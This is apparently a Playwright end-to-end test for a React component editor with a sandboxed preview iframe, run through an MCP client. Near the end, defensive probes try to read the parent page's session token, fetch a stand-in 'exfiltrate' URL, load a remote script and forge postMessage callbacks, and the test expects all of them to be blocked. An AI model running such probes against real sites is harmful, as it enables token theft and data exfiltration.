import { test, expect } from '@playwright/test';
import { mkdtemp, mkdir, cp, readFile, rm } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';
import { unzipSync, strFromU8 } from 'fflate';

test('React Code browser: compose, update props, interact, export, reopen and refuse isolation escapes', async ({ page }) => {
  test.setTimeout(90000);
  const directory = await mkdtemp(join(tmpdir(), 'react-code-browser-'));
  const bundle = join(directory, 'bundle');
  await mkdir(join(bundle, 'ui'), { recursive: true });
  for (const [source, target] of [['dist/editor.html', 'editor.html'], ['dist-browser/browser.html', 'browser.html'], ['dist-react-preview/react-preview.html', 'react-preview.html']]) await cp(source, join(bundle, 'ui', target));
  const client = new Client({ name: 'react-code-browser', version: '1' });
  const errors: string[] = [];
  const blockedConsole: string[] = [];
  let probing = false;
  page.on('pageerror', error => errors.push(error.message));
  page.on('console', message => { if (message.type() === 'error') {
    if (probing && (message.text().includes('Content Security Policy') || message.text().includes('violates the following Content Security Policy'))) blockedConsole.push(message.text());
    else errors.push(message.text());
  } });
  let previewUrl = '';
  try {
    await client.connect(new StdioClientTransport({ command: process.execPath, args: ['--import', 'tsx', 'tests/code-host.mjs'], cwd: process.cwd(), env: { ...process.env, EDITOR_DATA_DIR: join(directory, 'data'), EDITOR_TEST_BUNDLE: bundle, EDITOR_TEST_URL_FILE: join(directory, 'url') } as Record<string, string> }));
    const call = async (name: string, args: Record<string, unknown>) => {
      const reply = await client.callTool({ name, arguments: args }); expect(reply.isError, JSON.stringify(reply)).not.toBe(true); return reply.structuredContent as any;
    };
    const { artifact } = await call('create_artifact', { kind: 'react-ui', title: 'Bundled React test' });
    await call('open_editor', {});
    await page.goto(await readFile(join(directory, 'url'), 'utf8'));
    await expect(page.locator('#status')).toContainText('Claude Codeに接続');
    const editor = page.frameLocator('#editor');
    const open = async () => {
      await editor.getByRole('button', { name: '成果物の一覧', exact: true }).click();
      await editor.locator('.proposal').filter({ hasText: 'Bundled React test' }).getByRole('button', { name: '開く', exact: true }).click();
      await expect(editor.getByText('Preview ready', { exact: true })).toBeVisible();
    };
    await open();
    const preview = editor.frameLocator('iframe[title="React component preview"]');
    await expect(preview.getByRole('heading', { name: 'React preview' })).toBeVisible();
    await editor.getByRole('button', { name: 'text · Text', exact: true }).click();
    await editor.getByLabel('Prop text', { exact: true }).fill('Updated props <script> stays text');
    await expect(preview.getByText('Updated props <script> stays text', { exact: true })).toBeVisible();
    await editor.getByLabel('Target slot').selectOption(JSON.stringify({ nodeId: 'panel', slotId: 'content' }));
    await editor.getByRole('button', { name: 'Insert Text', exact: true }).click();
    await editor.getByLabel('Prop text', { exact: true }).fill('New nested component');
    await expect(preview.getByText('New nested component', { exact: true })).toBeVisible();
    await editor.getByRole('button', { name: 'Interact', exact: true }).click();
    await expect(editor.getByText('Preview ready', { exact: true })).toBeVisible();
    await preview.getByRole('button', { name: 'Count: 0', exact: true }).click();
    await expect(preview.getByRole('button', { name: 'Count: 1', exact: true })).toBeVisible();
    await expect(editor.getByText('Callback onChange: 1', { exact: true })).toBeVisible();
    await editor.getByRole('button', { name: '保存', exact: true }).click();
    await expect(editor.locator('.save-state')).toContainText('v2');
    const saved = (await call('read_artifact', { artifactId: artifact.id })).artifact;
    expect(saved.content.nodes).toHaveLength(4);
    expect(saved.content.nodes.find((n: any) => n.id === 'counter').props.initial).toBe(0);
    const download = page.waitForEvent('download');
    await editor.getByRole('button', { name: 'Export React TSX', exact: true }).click();
    const output = await download; expect(output.suggestedFilename()).toBe('react-screen.zip');
    const files = unzipSync(await readFile((await output.path())!));
    expect(Object.keys(files).sort()).toEqual(['PluginComponents.tsx', 'README.md', 'Screen.css', 'Screen.tsx', 'composition.json', 'manifest.json'].sort());
    expect(strFromU8(files['Screen.tsx'])).toContain('New nested component');
    expect(strFromU8(files['PluginComponents.tsx'])).toBe(await readFile('src/react-preview/PluginComponents.tsx', 'utf8'));
    for (let i = 0; i < 3; i++) {
      await editor.getByRole('button', { name: 'Restart preview', exact: true }).click();
      await expect(editor.getByText('Preview ready', { exact: true })).toBeVisible();
      await expect(preview.getByRole('button', { name: 'Count: 0', exact: true })).toBeVisible();
    }
    // New tab document/session, actual server retains composition without runtime state.
    for (let i = 0; i < 2; i++) { await page.reload(); await expect(page.locator('#status')).toContainText('Claude Codeに接続'); await open(); await expect(preview.getByText('New nested component', { exact: true })).toBeVisible(); }
    const child = page.frames().find(f => f.url().endsWith('/react-preview.html'))!;
    previewUrl = child.url();
    const denied = await child.evaluate(() => {
      const result: Record<string, boolean> = {};
      for (const [key, probe] of Object.entries({ parentDOM: () => parent.document.body, parentStorage: () => parent.sessionStorage.getItem('editor-browser-token'), topStorage: () => top!.sessionStorage.getItem('editor-browser-token') })) {
        try { probe(); result[key] = false; } catch (e) { result[key] = e instanceof DOMException && e.name === 'SecurityError'; }
      }
      result.noLocalToken = sessionStorage.getItem('editor-browser-token') === null;
      return result;
    });
    expect(denied).toEqual({ parentDOM: true, parentStorage: true, topStorage: true, noLocalToken: true });
    // These probes run through browser automation, not an application code input.
    expect(errors).toEqual([]);
    probing = true;
    const blocked = await child.evaluate(async () => {
      const results = await Promise.all(['https://example.invalid/exfiltrate', location.origin + '/mcp'].map(async url => { try { await fetch(url); return false; } catch { return true; } }));
      const scriptBlocked = await new Promise<boolean>(resolve => { const s = document.createElement('script'); s.src = 'https://example.invalid/script.js'; s.onerror = () => resolve(true); s.onload = () => resolve(false); document.body.append(s); });
      return { results, scriptBlocked };
    });
    expect(blocked).toEqual({ results: [true, true], scriptBlocked: true });
    expect(blockedConsole.length).toBeGreaterThanOrEqual(2);
    // A foreign source cannot fake readiness/callbacks or mutate the preview.
    await page.evaluate(() => { window.frames[0].postMessage({ protocol: 1, type: 'callback', nodeId: 'counter', event: 'onChange', arguments: ['forged'] }, location.origin); });
    await expect(editor.getByText('Callback onChange: forged', { exact: true })).toHaveCount(0);
    await expect(preview.getByText('New nested component', { exact: true })).toBeVisible();
    expect(errors).toEqual([]);
    await page.screenshot({ path: 'test-results/react-preview-code.png', fullPage: true });
    // Unknown runtime identities remain retained but execution fails closed.
    const bad = structuredClone(saved.content); bad.environment.ref.version = '99.0.0';
    // Change through native JSON import with an invalid environment hash: addressed error.
    await editor.getByLabel('Import composition JSON', { exact: true }).setInputFiles({ name: 'invalid.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(bad)) });
    await expect(editor.getByText(/Import blocked:/)).toBeVisible();
    await expect(preview.getByText('New nested component', { exact: true })).toBeVisible();
  } finally {
    await client.close();
    if (previewUrl) await expect.poll(async () => { try { await fetch(previewUrl); return false; } catch { return true; } }).toBe(true);
    await rm(directory, { recursive: true, force: true });
  }
});
